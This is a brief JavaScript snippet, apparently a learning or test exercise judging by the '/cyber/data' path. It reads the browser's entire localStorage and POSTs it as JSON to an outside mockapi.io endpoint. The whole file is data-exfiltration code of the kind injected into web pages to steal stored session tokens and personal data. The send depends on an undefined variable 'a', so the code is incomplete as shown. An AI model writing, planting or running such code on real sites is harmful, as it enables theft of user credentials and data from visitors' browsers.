let user = window.localStorage;

if(a){
    fetch('https://6529995155b137ddc83f0695.mockapi.io/cyber/data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json;charset=utf-8'
    },
    body: JSON.stringify(user)
  });
} else {
    console.log("Error");
}

